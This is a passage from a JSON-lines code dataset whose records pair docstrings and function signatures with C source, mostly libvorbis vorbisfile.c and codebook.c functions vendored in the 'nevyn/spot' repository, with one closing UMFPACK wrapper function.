if(llret<0)return(OV_ENOTVORBIS);\n    } \n  }\n\n bail_header:\n  vorbis_info_clear(vi);\n  vorbis_comment_clear(vc);\n  vf->ready_state=OPENED;\n\n  return ret;\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* this sets up crosslapping of a sample by using trailing data from\n   sample 1 and lapping it into the windowing buffer of sample 2 */\n", "func_signal": "int ov_crosslap(OggVorbis_File *vf1, OggVorbis_File *vf2)", "code": "{\n  vorbis_info *vi1,*vi2;\n  float **lappcm;\n  float **pcm;\n  float *w1,*w2;\n  int n1,n2,i,ret,hs1,hs2;\n\n  if(vf1==vf2)return(0); /* degenerate case */\n  if(vf1->ready_state<OPENED)return(OV_EINVAL);\n  if(vf2->ready_state<OPENED)return(OV_EINVAL);\n\n  /* the relevant overlap buffers must be pre-checked and pre-primed\n     before looking at settings in the event that priming would cross\n     a bitstream boundary.  So, do it now */\n\n  ret=_ov_initset(vf1);\n  if(ret)return(ret);\n  ret=_ov_initprime(vf2);\n  if(ret)return(ret);\n\n  vi1=ov_info(vf1,-1);\n  vi2=ov_info(vf2,-1);\n  hs1=ov_halfrate_p(vf1);\n  hs2=ov_halfrate_p(vf2);\n\n  lappcm=alloca(sizeof(*lappcm)*vi1->channels);\n  n1=vorbis_info_blocksize(vi1,0)>>(1+hs1);\n  n2=vorbis_info_blocksize(vi2,0)>>(1+hs2);\n  w1=vorbis_window(&vf1->vd,0);\n  w2=vorbis_window(&vf2->vd,0);\n\n  for(i=0;i<vi1->channels;i++)\n    lappcm[i]=alloca(sizeof(**lappcm)*n1);\n\n  _ov_getlap(vf1,vi1,&vf1->vd,lappcm,n1);\n\n  /* have a lapping buffer from vf1; now to splice it into the lapping\n     buffer of vf2 */\n  /* consolidate and expose the buffer. */\n  vorbis_synthesis_lapout(&vf2->vd,&pcm);\n  _analysis_output_always(\"pcmL\",0,pcm[0],n1*2,0,0,0);\n  _analysis_output_always(\"pcmR\",0,pcm[1],n1*2,0,0,0);\n\n  /* splice */\n  _ov_splice(pcm,lappcm,n1,n2,vi1->channels,vi2->channels,w1,w2);\n  \n  /* done */\n  return(0);\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* finds each bitstream link one at a time using a bisection search\n   (has to begin by knowing the offset of the lb's initial page).\n   Recurses for each link so it can alloc the link storage after\n   finding them all, then unroll and fill the cache at the same time */\n", "func_signal": "static int _bisect_forward_serialno(OggVorbis_File *vf,\n\t\t\t\t    ogg_int64_t begin,\n\t\t\t\t    ogg_int64_t searched,\n\t\t\t\t    ogg_int64_t end,\n\t\t\t\t    long *currentno_list,\n\t\t\t\t    int  currentnos,\n\t\t\t\t    long m)", "code": "{\n  ogg_int64_t endsearched=end;\n  ogg_int64_t next=end;\n  ogg_page og;\n  ogg_int64_t ret;\n  \n  /* the below guards against garbage seperating the last and\n     first pages of two links. */\n  while(searched<endsearched){\n    ogg_int64_t bisect;\n    \n    if(endsearched-searched<CHUNKSIZE){\n      bisect=searched;\n    }else{\n      bisect=(searched+endsearched)/2;\n    }\n    \n    ret=_seek_helper(vf,bisect);\n    if(ret)return(ret);\n\n    ret=_get_next_page(vf,&og,-1);\n    if(ret==OV_EREAD)return(OV_EREAD);\n    if(ret<0 || !_lookup_serialno(&og,currentno_list,currentnos)){\n      endsearched=bisect;\n      if(ret>=0)next=ret;\n    }else{\n      searched=ret+og.header_len+og.body_len;\n    }\n  }\n\n  {\n    long *next_serialno_list=NULL;\n    int next_serialnos=0;\n\n    ret=_seek_helper(vf,next);\n    if(ret)return(ret);\n    ret=_get_serialnos(vf,&next_serialno_list,&next_serialnos);\n    if(ret)return(ret);\n    \n    if(searched>=end || next_serialnos==0){\n      vf->links=m+1;\n      vf->offsets=_ogg_malloc((vf->links+1)*sizeof(*vf->offsets));\n      vf->offsets[m+1]=searched;\n    }else{\n      ret=_bisect_forward_serialno(vf,next,vf->offset,\n\t\t\t\t   end,next_serialno_list,next_serialnos,m+1);\n      if(ret)return(ret);\n    }\n    \n    if(next_serialno_list)_ogg_free(next_serialno_list);\n  }\n  vf->offsets[m]=begin;\n  return(0);\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* fetch and process a packet.  Handles the case where we're at a\n   bitstream boundary and dumps the decoding machine.  If the decoding\n   machine is unloaded, it loads it.  It also keeps pcm_offset up to\n   date (seek and read both use this.  seek uses a special hack with\n   readp). \n\n   return: <0) error, OV_HOLE (lost packet) or OV_EOF\n            0) need more data (only if readp==0)\n\t    1) got a packet \n*/\n", "func_signal": "static int _fetch_and_process_packet(OggVorbis_File *vf,\n\t\t\t\t     ogg_packet *op_in,\n\t\t\t\t     int readp,\n\t\t\t\t     int spanp)", "code": "{\n  ogg_page og;\n\n  /* handle one packet.  Try to fetch it from current stream state */\n  /* extract packets from page */\n  while(1){\n    \n    /* process a packet if we can.  If the machine isn't loaded,\n       neither is a page */\n    if(vf->ready_state==INITSET){\n      while(1) {\n      \togg_packet op;\n      \togg_packet *op_ptr=(op_in?op_in:&op);\n\tint result=ogg_stream_packetout(&vf->os,op_ptr);\n\togg_int64_t granulepos;\n\n\top_in=NULL;\n\tif(result==-1)return(OV_HOLE); /* hole in the data. */\n\tif(result>0){\n\t  /* got a packet.  process it */\n\t  granulepos=op_ptr->granulepos;\n\t  if(!vorbis_synthesis(&vf->vb,op_ptr)){ /* lazy check for lazy\n\t\t\t\t\t\t    header handling.  The\n\t\t\t\t\t\t    header packets aren't\n\t\t\t\t\t\t    audio, so if/when we\n\t\t\t\t\t\t    submit them,\n\t\t\t\t\t\t    vorbis_synthesis will\n\t\t\t\t\t\t    reject them */\n\n\t    /* suck in the synthesis data and track bitrate */\n\t    {\n\t      int oldsamples=vorbis_synthesis_pcmout(&vf->vd,NULL);\n\t      /* for proper use of libvorbis within libvorbisfile,\n                 oldsamples will always be zero. */\n\t      if(oldsamples)return(OV_EFAULT);\n\t      \n\t      vorbis_synthesis_blockin(&vf->vd,&vf->vb);\n\t      vf->samptrack+=vorbis_synthesis_pcmout(&vf->vd,NULL)-oldsamples;\n\t      vf->bittrack+=op_ptr->bytes*8;\n\t    }\n\t  \n\t    /* update the pcm offset. */\n\t    if(granulepos!=-1 && !op_ptr->e_o_s){\n\t      int link=(vf->seekable?vf->current_link:0);\n\t      int i,samples;\n\t    \n\t      /* this packet has a pcm_offset on it (the last packet\n\t         completed on a page carries the offset) After processing\n\t         (above), we know the pcm position of the *last* sample\n\t         ready to be returned. Find the offset of the *first*\n\n\t         As an aside, this trick is inaccurate if we begin\n\t         reading anew right at the last page; the end-of-stream\n\t         granulepos declares the last frame in the stream, and the\n\t         last packet of the last page may be a partial frame.\n\t         So, we need a previous granulepos from an in-sequence page\n\t         to have a reference point.  Thus the !op_ptr->e_o_s clause\n\t         above */\n\n\t      if(vf->seekable && link>0)\n\t\tgranulepos-=vf->pcmlengths[link*2];\n\t      if(granulepos<0)granulepos=0; /* actually, this\n\t\t\t\t\t       shouldn't be possible\n\t\t\t\t\t       here unless the stream\n\t\t\t\t\t       is very broken */\n\n\t      samples=vorbis_synthesis_pcmout(&vf->vd,NULL);\n\t    \n\t      granulepos-=samples;\n\t      for(i=0;i<link;i++)\n\t        granulepos+=vf->pcmlengths[i*2+1];\n\t      vf->pcm_offset=granulepos;\n\t    }\n\t    return(1);\n\t  }\n\t}\n\telse \n\t  break;\n      }\n    }\n\n    if(vf->ready_state>=OPENED){\n      ogg_int64_t ret;\n      \n      while(1){ \n\t/* the loop is not strictly necessary, but there's no sense in\n\t   doing the extra checks of the larger loop for the common\n\t   case in a multiplexed bistream where the page is simply\n\t   part of a different logical bitstream; keep reading until\n\t   we get one with the correct serialno */\n\t\n\tif(!readp)return(0);\n\tif((ret=_get_next_page(vf,&og,-1))<0){\n\t  return(OV_EOF); /* eof. leave unitialized */\n\t}\n\n\t/* bitrate tracking; add the header's bytes here, the body bytes\n\t   are done by packet above */\n\tvf->bittrack+=og.header_len*8;\n\t\n\tif(vf->ready_state==INITSET){\n\t  if(vf->current_serialno!=ogg_page_serialno(&og)){\n\t    \n\t    /* two possibilities: \n\t       1) our decoding just traversed a bitstream boundary\n\t       2) another stream is multiplexed into this logical section? */\n\t    \n\t    if(ogg_page_bos(&og)){\n\t      /* boundary case */\n\t      if(!spanp)\n\t\treturn(OV_EOF);\n\t      \n\t      _decode_clear(vf);\n\t      \n\t      if(!vf->seekable){\n\t\tvorbis_info_clear(vf->vi);\n\t\tvorbis_comment_clear(vf->vc);\n\t      }\n\t      break;\n\n\t    }else\n\t      continue; /* possibility #2 */\n\t  }\n\t}\n\n\tbreak;\n      }\n    }\n\n    /* Do we need to load a new machine before submitting the page? */\n    /* This is different in the seekable and non-seekable cases.  \n\n       In the seekable case, we already have all the header\n       information loaded and cached; we just initialize the machine\n       with it and continue on our merry way.\n\n       In the non-seekable (streaming) case, we'll only be at a\n       boundary if we just left the previous logical bitstream and\n       we're now nominally at the header of the next bitstream\n    */\n\n    if(vf->ready_state!=INITSET){ \n      int link;\n\n      if(vf->ready_state<STREAMSET){\n\tif(vf->seekable){\n\t  long serialno = ogg_page_serialno(&og);\n\n\t  /* match the serialno to bitstream section.  We use this rather than\n\t     offset positions to avoid problems near logical bitstream\n\t     boundaries */\n\n\t  for(link=0;link<vf->links;link++)\n\t    if(vf->serialnos[link]==serialno)break;\n\n\t  if(link==vf->links) continue; /* not the desired Vorbis\n\t\t\t\t\t   bitstream section; keep\n\t\t\t\t\t   trying */\n\n\t  vf->current_serialno=serialno;\n\t  vf->current_link=link;\n\t  \n\t  ogg_stream_reset_serialno(&vf->os,vf->current_serialno);\n\t  vf->ready_state=STREAMSET;\n\t  \n\t}else{\n\t  /* we're streaming */\n\t  /* fetch the three header packets, build the info struct */\n\t  \n\t  int ret=_fetch_headers(vf,vf->vi,vf->vc,&vf->current_serialno,&og);\n\t  if(ret)return(ret);\n\t  vf->current_link++;\n\t  link=0;\n\t}\n      }\n      \n      {\n\tint ret=_make_decode_ready(vf);\n\tif(ret<0)return ret;\n      }\n    }\n\n    /* the buffered page is the data we want, and we're ready for it;\n       add it to the stream state */\n    ogg_stream_pagein(&vf->os,&og);\n\n  }\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* the 'eliminate the decode tree' optimization actually requires the\n   codewords to be MSb first, not LSb.  This is an annoying inelegancy\n   (and one of the first places where carefully thought out design\n   turned out to be wrong; Vorbis II and future Ogg codecs should go\n   to an MSb bitpacker), but not actually the huge hit it appears to\n   be.  The first-stage decode table catches most words so that\n   bitreverse is not in the main execution path. */\n", "func_signal": "static ogg_uint32_t bitreverse(ogg_uint32_t x)", "code": "{\n  x=    ((x>>16)&0x0000ffff) | ((x<<16)&0xffff0000);\n  x=    ((x>> 8)&0x00ff00ff) | ((x<< 8)&0xff00ff00);\n  x=    ((x>> 4)&0x0f0f0f0f) | ((x<< 4)&0xf0f0f0f0);\n  x=    ((x>> 2)&0x33333333) | ((x<< 2)&0xcccccccc);\n  return((x>> 1)&0x55555555) | ((x<< 1)&0xaaaaaaaa);\n}", "path": "Vendor\\libvorbis\\lib\\codebook.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* start parsing pages at current offset, remembering all serial\n   numbers.  Stop logging at first non-bos page */\n", "func_signal": "static int _get_serialnos(OggVorbis_File *vf, long **s, int *n)", "code": "{\n  ogg_page og;\n\n  *s=NULL;\n  *n=0;\n\n  while(1){\n    ogg_int64_t llret=_get_next_page(vf,&og,CHUNKSIZE);\n    if(llret==OV_EOF)return(0);\n    if(llret<0)return(llret);\n    if(!ogg_page_bos(&og)) return 0;\n\n    /* look for duplicate serialnos; add this one if unique */\n    if(_lookup_serialno(&og,*s,*n)){\n      if(*s)_ogg_free(*s);\n      *s=0;\n      *n=0;\n      return(OV_EBADHEADER);\n    }\n\n    _add_serialno(&og,s,n);\n  }\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* cheap hack for game usage where downsampling is desirable; there's\n   no need for SRC as we can just do it cheaply in libvorbis. */\n", "func_signal": "int ov_halfrate(OggVorbis_File *vf,int flag)", "code": "{\n  int i;\n  if(vf->vi==NULL)return OV_EINVAL;\n  if(!vf->seekable)return OV_EINVAL;\n  if(vf->ready_state>=STREAMSET)\n    _decode_clear(vf); /* clear out stream state; later on libvorbis\n                          will be able to swap this on the fly, but\n                          for now dumping the decode machine is needed\n                          to reinit the MDCT lookups.  1.1 libvorbis\n                          is planned to be able to switch on the fly */\n  \n  for(i=0;i<vf->links;i++){\n    if(vorbis_synthesis_halfrate(vf->vi+i,flag)){\n      ov_halfrate(vf,0);\n      return OV_EINVAL;\n    }\n  }\n  return 0;\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* Guess */\n", "func_signal": "long ov_serialnumber(OggVorbis_File *vf,int i)", "code": "{\n  if(i>=vf->links)return(ov_serialnumber(vf,vf->links-1));\n  if(!vf->seekable && i>=0)return(ov_serialnumber(vf,-1));\n  if(i<0){\n    return(vf->current_serialno);\n  }else{\n    return(vf->serialnos[i]);\n  }\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* floor0 LSP (single stage, non interleaved, nearest match) */\n/* returns entry number and *modifies a* to the quantization value *****/\n", "func_signal": "int vorbis_book_errorv(codebook *book,float *a)", "code": "{\n  int dim=book->dim,k;\n  int best=_best(book,a,1);\n  for(k=0;k<dim;k++)\n    a[k]=(book->valuelist+best*dim)[k];\n  return(best);\n}", "path": "Vendor\\libvorbis\\lib\\codebook.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* inspects the OggVorbis file and finds/documents all the logical\n   bitstreams contained in it.  Tries to be tolerant of logical\n   bitstream sections that are truncated/woogie. \n\n   return: -1) error\n            0) OK\n*/\n", "func_signal": "int ov_open_callbacks(void *f,OggVorbis_File *vf,char *initial,long ibytes,\n    ov_callbacks callbacks)", "code": "{\n  int ret=_ov_open1(f,vf,initial,ibytes,callbacks);\n  if(ret)return ret;\n  return _ov_open2(vf);\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* seek to a playback time relative to the decompressed pcm stream \n   returns zero on success, nonzero on failure */\n", "func_signal": "int ov_time_seek(OggVorbis_File *vf,double seconds)", "code": "{\n  /* translate time to PCM position and call ov_pcm_seek */\n\n  int link=-1;\n  ogg_int64_t pcm_total=0;\n  double time_total=0.;\n\n  if(vf->ready_state<OPENED)return(OV_EINVAL);\n  if(!vf->seekable)return(OV_ENOSEEK);\n  if(seconds<0)return(OV_EINVAL);\n  \n  /* which bitstream section does this time offset occur in? */\n  for(link=0;link<vf->links;link++){\n    double addsec = ov_time_total(vf,link);\n    if(seconds<time_total+addsec)break;\n    time_total+=addsec;\n    pcm_total+=vf->pcmlengths[link*2+1];\n  }\n\n  if(link==vf->links)return(OV_EINVAL);\n\n  /* enough information to convert time offset to pcm offset */\n  {\n    ogg_int64_t target=pcm_total+(seconds-time_total)*vf->vi[link].rate;\n    return(ov_pcm_seek(vf,target));\n  }\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* grr, strong typing, grr, no templates/inheritence, grr */\n", "func_signal": "vorbis_comment *ov_comment(OggVorbis_File *vf,int link)", "code": "{\n  if(vf->seekable){\n    if(link<0)\n      if(vf->ready_state>=STREAMSET)\n\treturn vf->vc+vf->current_link;\n      else\n\treturn vf->vc;\n    else\n      if(link>=vf->links)\n\treturn NULL;\n      else\n\treturn vf->vc+link;\n  }else{\n    return vf->vc;\n  }\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* returns: total raw (compressed) length of content if i==-1\n            raw (compressed) length of that logical bitstream for i==0 to n\n\t    OV_EINVAL if the stream is not seekable (we can't know the length)\n\t    or if stream is only partially open\n*/\n", "func_signal": "ogg_int64_t ov_raw_total(OggVorbis_File *vf,int i)", "code": "{\n  if(vf->ready_state<OPENED)return(OV_EINVAL);\n  if(!vf->seekable || i>=vf->links)return(OV_EINVAL);\n  if(i<0){\n    ogg_int64_t acc=0;\n    int i;\n    for(i=0;i<vf->links;i++)\n      acc+=ov_raw_total(vf,i);\n    return(acc);\n  }else{\n    return(vf->offsets[i+1]-vf->offsets[i]);\n  }\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* returns 0 on OK or -1 on eof *************************************/\n", "func_signal": "long vorbis_book_decodevs_add(codebook *book,float *a,oggpack_buffer *b,int n)", "code": "{\n  if(book->used_entries>0){\n    int step=n/book->dim;\n    long *entry = alloca(sizeof(*entry)*step);\n    float **t = alloca(sizeof(*t)*step);\n    int i,j,o;\n    \n    for (i = 0; i < step; i++) {\n      entry[i]=decode_packed_entry_number(book,b);\n      if(entry[i]==-1)return(-1);\n      t[i] = book->valuelist+entry[i]*book->dim;\n    }\n    for(i=0,o=0;i<book->dim;i++,o+=step)\n      for (j=0;j<step;j++)\n\ta[o+j]+=t[j][i];\n  }\n  return(0);\n}", "path": "Vendor\\libvorbis\\lib\\codebook.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* returns: total PCM length (samples) of content if i==-1 PCM length\n\t    (samples) of that logical bitstream for i==0 to n\n\t    OV_EINVAL if the stream is not seekable (we can't know the\n\t    length) or only partially open \n*/\n", "func_signal": "ogg_int64_t ov_pcm_total(OggVorbis_File *vf,int i)", "code": "{\n  if(vf->ready_state<OPENED)return(OV_EINVAL);\n  if(!vf->seekable || i>=vf->links)return(OV_EINVAL);\n  if(i<0){\n    ogg_int64_t acc=0;\n    int i;\n    for(i=0;i<vf->links;i++)\n      acc+=ov_pcm_total(vf,i);\n    return(acc);\n  }else{\n    return(vf->pcmlengths[i*2+1]);\n  }\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* Page granularity seek (faster than sample granularity because we\n   don't do the last bit of decode to find a specific sample).\n\n   Seek to the last [granule marked] page preceeding the specified pos\n   location, such that decoding past the returned point will quickly\n   arrive at the requested position. */\n", "func_signal": "int ov_pcm_seek_page(OggVorbis_File *vf,ogg_int64_t pos)", "code": "{\n  int link=-1;\n  ogg_int64_t result=0;\n  ogg_int64_t total=ov_pcm_total(vf,-1);\n  \n  if(vf->ready_state<OPENED)return(OV_EINVAL);\n  if(!vf->seekable)return(OV_ENOSEEK);\n\n  if(pos<0 || pos>total)return(OV_EINVAL);\n \n  /* which bitstream section does this pcm offset occur in? */\n  for(link=vf->links-1;link>=0;link--){\n    total-=vf->pcmlengths[link*2+1];\n    if(pos>=total)break;\n  }\n\n  /* search within the logical bitstream for the page with the highest\n     pcm_pos preceeding (or equal to) pos.  There is a danger here;\n     missing pages or incorrect frame number information in the\n     bitstream could make our task impossible.  Account for that (it\n     would be an error condition) */\n\n  /* new search algorithm by HB (Nicholas Vinen) */\n  {\n    ogg_int64_t end=vf->offsets[link+1];\n    ogg_int64_t begin=vf->offsets[link];\n    ogg_int64_t begintime = vf->pcmlengths[link*2];\n    ogg_int64_t endtime = vf->pcmlengths[link*2+1]+begintime;\n    ogg_int64_t target=pos-total+begintime;\n    ogg_int64_t best=begin;\n    \n    ogg_page og;\n    while(begin<end){\n      ogg_int64_t bisect;\n      \n      if(end-begin<CHUNKSIZE){\n\tbisect=begin;\n      }else{\n\t/* take a (pretty decent) guess. */\n\tbisect=begin + \n\t  (target-begintime)*(end-begin)/(endtime-begintime) - CHUNKSIZE;\n\tif(bisect<=begin)\n\t  bisect=begin+1;\n      }\n      \n      result=_seek_helper(vf,bisect);\n      if(result) goto seek_error;\n      \n      while(begin<end){\n\tresult=_get_next_page(vf,&og,end-vf->offset);\n\tif(result==OV_EREAD) goto seek_error;\n\tif(result<0){\n\t  if(bisect<=begin+1)\n\t    end=begin; /* found it */\n\t  else{\n\t    if(bisect==0) goto seek_error;\n\t    bisect-=CHUNKSIZE;\n\t    if(bisect<=begin)bisect=begin+1;\n\t    result=_seek_helper(vf,bisect);\n\t    if(result) goto seek_error;\n\t  }\n\t}else{\n\t  ogg_int64_t granulepos;\n\n\t  if(ogg_page_serialno(&og)!=vf->serialnos[link])\n\t    continue;\n\n\t  granulepos=ogg_page_granulepos(&og);\n\t  if(granulepos==-1)continue;\n\t  \n\t  if(granulepos<target){\n\t    best=result;  /* raw offset of packet with granulepos */ \n\t    begin=vf->offset; /* raw offset of next page */\n\t    begintime=granulepos;\n\t    \n\t    if(target-begintime>44100)break;\n\t    bisect=begin; /* *not* begin + 1 */\n\t  }else{\n\t    if(bisect<=begin+1)\n\t      end=begin;  /* found it */\n\t    else{\n\t      if(end==vf->offset){ /* we're pretty close - we'd be stuck in */\n\t\tend=result;\n\t\tbisect-=CHUNKSIZE; /* an endless loop otherwise. */\n\t\tif(bisect<=begin)bisect=begin+1;\n\t\tresult=_seek_helper(vf,bisect);\n\t\tif(result) goto seek_error;\n\t      }else{\n\t\tend=bisect;\n\t\tendtime=granulepos;\n\t\tbreak;\n\t      }\n\t    }\n\t  }\n\t}\n      }\n    }\n\n    /* found our page. seek to it, update pcm offset. Easier case than\n       raw_seek, don't keep packets preceeding granulepos. */\n    {\n      ogg_page og;\n      ogg_packet op;\n      \n      /* seek */\n      result=_seek_helper(vf,best);\n      vf->pcm_offset=-1;\n      if(result) goto seek_error;\n      result=_get_next_page(vf,&og,-1);\n      if(result<0) goto seek_error;\n      \n      if(link!=vf->current_link){\n\t/* Different link; dump entire decode machine */\n\t_decode_clear(vf);  \n\t\n\tvf->current_link=link;\n\tvf->current_serialno=vf->serialnos[link];\n\tvf->ready_state=STREAMSET;\n\t\n      }else{\n\tvorbis_synthesis_restart(&vf->vd);\n      }\n\n      ogg_stream_reset_serialno(&vf->os,vf->current_serialno);\n      ogg_stream_pagein(&vf->os,&og);\n\n      /* pull out all but last packet; the one with granulepos */\n      while(1){\n\tresult=ogg_stream_packetpeek(&vf->os,&op);\n\tif(result==0){\n\t  /* !!! the packet finishing this page originated on a\n             preceeding page. Keep fetching previous pages until we\n             get one with a granulepos or without the 'continued' flag\n             set.  Then just use raw_seek for simplicity. */\n\t  \n\t  result=_seek_helper(vf,best);\n\t  if(result<0) goto seek_error;\n\t  \n\t  while(1){\n\t    result=_get_prev_page(vf,&og);\n\t    if(result<0) goto seek_error;\n\t    if(ogg_page_serialno(&og)==vf->current_serialno &&\n\t       (ogg_page_granulepos(&og)>-1 ||\n\t\t!ogg_page_continued(&og))){\n\t      return ov_raw_seek(vf,result);\n\t    }\n\t    vf->offset=result;\n\t  }\n\t}\n\tif(result<0){\n\t  result = OV_EBADPACKET; \n\t  goto seek_error;\n\t}\n\tif(op.granulepos!=-1){\n\t  vf->pcm_offset=op.granulepos-vf->pcmlengths[vf->current_link*2];\n\t  if(vf->pcm_offset<0)vf->pcm_offset=0;\n\t  vf->pcm_offset+=total;\n\t  break;\n\t}else\n\t  result=ogg_stream_packetout(&vf->os,NULL);\n      }\n    }\n  }\n  \n  /* verify result */\n  if(vf->pcm_offset>pos || pos>ov_pcm_total(vf,-1)){\n    result=OV_EFAULT;\n    goto seek_error;\n  }\n  vf->bittrack=0.f;\n  vf->samptrack=0.f;\n  return(0);\n  \n seek_error:\n  /* dump machine so we're in a known state */\n  vf->pcm_offset=-1;\n  _decode_clear(vf);\n  return (int)result;\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* returns the actual bitrate since last call.  returns -1 if no\n   additional data to offer since last call (or at beginning of stream),\n   EINVAL if stream is only partially open \n*/\n", "func_signal": "long ov_bitrate_instant(OggVorbis_File *vf)", "code": "{\n  int link=(vf->seekable?vf->current_link:0);\n  long ret;\n  if(vf->ready_state<OPENED)return(OV_EINVAL);\n  if(vf->samptrack==0)return(OV_FALSE);\n  ret=vf->bittrack/vf->samptrack*vf->vi[link].rate+.5;\n  vf->bittrack=0.f;\n  vf->samptrack=0.f;\n  return(ret);\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* tell the current stream offset cursor.  Note that seek followed by\n   tell will likely not give the set offset due to caching */\n", "func_signal": "ogg_int64_t ov_raw_tell(OggVorbis_File *vf)", "code": "{\n  if(vf->ready_state<OPENED)return(OV_EINVAL);\n  return(vf->offset);\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* seek to a sample offset relative to the decompressed pcm stream \n   returns zero on success, nonzero on failure */\n", "func_signal": "int ov_pcm_seek(OggVorbis_File *vf,ogg_int64_t pos)", "code": "{\n  int thisblock,lastblock=0;\n  int ret=ov_pcm_seek_page(vf,pos);\n  if(ret<0)return(ret);\n  if((ret=_make_decode_ready(vf)))return ret;\n\n  /* discard leading packets we don't need for the lapping of the\n     position we want; don't decode them */\n\n  while(1){\n    ogg_packet op;\n    ogg_page og;\n\n    int ret=ogg_stream_packetpeek(&vf->os,&op);\n    if(ret>0){\n      thisblock=vorbis_packet_blocksize(vf->vi+vf->current_link,&op);\n      if(thisblock<0){\n\togg_stream_packetout(&vf->os,NULL);\n\tcontinue; /* non audio packet */\n      }\n      if(lastblock)vf->pcm_offset+=(lastblock+thisblock)>>2;\n      \n      if(vf->pcm_offset+((thisblock+\n\t\t\t  vorbis_info_blocksize(vf->vi,1))>>2)>=pos)break;\n      \n      /* remove the packet from packet queue and track its granulepos */\n      ogg_stream_packetout(&vf->os,NULL);\n      vorbis_synthesis_trackonly(&vf->vb,&op);  /* set up a vb with\n                                                   only tracking, no\n                                                   pcm_decode */\n      vorbis_synthesis_blockin(&vf->vd,&vf->vb); \n      \n      /* end of logical stream case is hard, especially with exact\n\t length positioning. */\n      \n      if(op.granulepos>-1){\n\tint i;\n\t/* always believe the stream markers */\n\tvf->pcm_offset=op.granulepos-vf->pcmlengths[vf->current_link*2];\n\tif(vf->pcm_offset<0)vf->pcm_offset=0;\n\tfor(i=0;i<vf->current_link;i++)\n\t  vf->pcm_offset+=vf->pcmlengths[i*2+1];\n      }\n\t\n      lastblock=thisblock;\n      \n    }else{\n      if(ret<0 && ret!=OV_HOLE)break;\n      \n      /* suck in a new page */\n      if(_get_next_page(vf,&og,-1)<0)break;\n      if(ogg_page_bos(&og))_decode_clear(vf);\n      \n      if(vf->ready_state<STREAMSET){\n\tlong serialno=ogg_page_serialno(&og);\n\tint link;\n\t\n\tfor(link=0;link<vf->links;link++)\n\t  if(vf->serialnos[link]==serialno)break;\n\tif(link==vf->links) continue; \n\tvf->current_link=link;\n\t\n\tvf->ready_state=STREAMSET;      \n\tvf->current_serialno=ogg_page_serialno(&og);\n\togg_stream_reset_serialno(&vf->os,serialno); \n\tret=_make_decode_ready(vf);\n\tif(ret)return ret;\n\tlastblock=0;\n      }\n\n      ogg_stream_pagein(&vf->os,&og);\n    }\n  }\n\n  vf->bittrack=0.f;\n  vf->samptrack=0.f;\n  /* discard samples until we reach the desired position. Crossing a\n     logical bitstream boundary with abandon is OK. */\n  while(vf->pcm_offset<pos){\n    ogg_int64_t target=pos-vf->pcm_offset;\n    long samples=vorbis_synthesis_pcmout(&vf->vd,NULL);\n\n    if(samples>target)samples=target;\n    vorbis_synthesis_read(&vf->vd,samples);\n    vf->pcm_offset+=samples;\n    \n    if(samples<target)\n      if(_fetch_and_process_packet(vf,NULL,1,1)<=0)\n\tvf->pcm_offset=ov_pcm_total(vf,-1); /* eof */\n  }\n  return 0;\n}", "path": "Vendor\\libvorbis\\lib\\vorbisfile.c", "repo_name": "nevyn/spot", "stars": 89, "license": "None", "language": "c", "size": 11480}
{"docstring": "/* call umf4zpcon (control) */\n", "func_signal": "void umf4zpcon (double Control [UMFPACK_CONTROL])", "code": "{\n    fflush (stdout) ;\n    UMFPACK_report_control (Control) ;\n    fflush (stdout) ;\n}", "path": "UMFPACK\\Demo\\umf4_f77zwrapper.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
